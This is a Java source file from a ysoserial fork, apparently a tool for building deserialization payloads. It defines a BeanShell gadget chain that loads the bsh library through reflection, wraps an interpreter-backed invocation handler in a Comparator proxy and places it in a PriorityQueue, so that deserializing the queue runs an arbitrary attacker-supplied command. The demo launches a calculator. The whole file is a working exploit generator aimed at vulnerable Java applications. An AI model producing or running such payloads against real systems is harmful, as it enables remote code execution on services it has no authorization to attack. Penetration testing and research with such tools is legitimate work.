package ysoserial.payloads;

import java.io.File;
import java.lang.reflect.*;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.Comparator;
import java.util.PriorityQueue;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.customize.BeanShellUtil;
import ysoserial.payloads.util.Reflections;
import ysoserial.payloads.util.PayloadRunner;

@SuppressWarnings({ "rawtypes", "unchecked" })
@Authors({Authors.BEARCAT})
public class BeanShell extends PayloadRunner implements ObjectPayload<PriorityQueue> {

    public PriorityQueue getObject(String command) throws Exception {

        String[] cmd = command.split("\\@");

        String relyJar = null;
        if (cmd[0].toLowerCase().startsWith("rely_jar:")) {
            relyJar = cmd[0].substring(cmd[0].indexOf(":") + 1);
        } else {
            throw new IllegalArgumentException("Command format is: [rely_jar]:/Users/bearcat/Desktop/bsh-2.0b1.jar@[cmd]:open -a calculator");
        }

        // BeanShell payload
        String payload = BeanShellUtil.getBshPayload(cmd[1]);

        // Create Interpreter
        Object interpreter = loader("bsh.Interpreter",relyJar).newInstance();
        Class<?> nameSpace = loader("bsh.NameSpace",relyJar);
	/*
		bsh.Interpreter()
			bsh.initRootSystemObject()
				bsh.setu("bsh.cwd", System.getProperty("user.dir"))
					bsh.cwd /Users/bearcat/Desktop/ysoserial
	*/
        Method setu = interpreter.getClass().getDeclaredMethod("setu",new Class[]{String.class,Object.class});
        setu.setAccessible(true);
        setu.invoke(interpreter,new Object[]{"bsh.cwd",null});

        Method eval = interpreter.getClass().getDeclaredMethod("eval",new Class[]{String.class});
        eval.invoke(interpreter,new Object[]{payload});

        Method getNameSpace = interpreter.getClass().getDeclaredMethod("getNameSpace");

        Class<?> xthis = loader("bsh.XThis",relyJar);
        Field handlerField = xthis.getDeclaredField("invocationHandler");
        handlerField.setAccessible(true);
        Constructor<?> xthisDeclaredConstructor = xthis.getDeclaredConstructor(nameSpace, interpreter.getClass());
        xthisDeclaredConstructor.setAccessible(true);
        Object xt = xthisDeclaredConstructor.newInstance(getNameSpace.invoke(interpreter), interpreter);
        handlerField.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) Reflections.getField(xt.getClass(), "invocationHandler").get(xt);

        Comparator comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class<?>[]{Comparator.class}, handler);

        final PriorityQueue<Object> priorityQueue = new PriorityQueue<Object>(2, comparator);
        Object[] queue = new Object[] {1,1};
        Reflections.setFieldValue(priorityQueue, "queue", queue);
        Reflections.setFieldValue(priorityQueue, "size", 2);

        return priorityQueue;
    }

    private Class<?> loader(String className,String jarFilePath) throws Exception{
        File file = new File(jarFilePath);
        URL url = file.toURI().toURL();
        URLClassLoader urlLoader = (URLClassLoader) ClassLoader.getSystemClassLoader();
        Class<URLClassLoader> sysClass = URLClassLoader.class;
        Method method = sysClass.getDeclaredMethod("addURL", new Class[] { URL.class });
        method.setAccessible(true);
        method.invoke(urlLoader, url);
        Class<?> objClass = urlLoader.loadClass(className);
        return objClass;
    }

    public static void main(String[] args) throws Exception {
        args = new String[]{"rely_jar:/Users/bearcat/Desktop/bsh-2.0b1.jar@cmd:open -a calculator"};
        PayloadRunner.run(BeanShell.class, args);
    }
}
